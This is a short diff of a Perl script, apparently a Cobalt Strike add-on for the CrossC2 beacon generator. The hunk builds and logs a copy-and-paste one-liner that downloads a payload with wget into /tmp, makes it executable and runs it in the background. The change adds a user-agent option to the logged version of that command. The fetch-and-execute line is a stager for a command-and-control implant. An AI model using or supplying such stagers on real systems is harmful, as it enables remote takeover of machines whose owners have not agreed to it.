@@ -54,7 +54,7 @@ sub dialogCallBack {
     # tell the user our URL
     prompt_text("Copy/Paste One-liner: ", "wget " . $url . " -O /tmp/" . $targetSaveName . " && chmod a+x /tmp/" . $targetSaveName . " && /tmp/" . $targetSaveName . "&", {});
 
-    elog("wget " . $url . " -O /tmp/" . $targetSaveName . " && chmod a+x /tmp/" . $targetSaveName . " && /tmp/" . $targetSaveName . "&");
+    elog("wget -U 'O' " . $url . " -O /tmp/" . $targetSaveName . " && chmod a+x /tmp/" . $targetSaveName . " && /tmp/" . $targetSaveName . "&");
 }
 
 sub genCrossC2 {
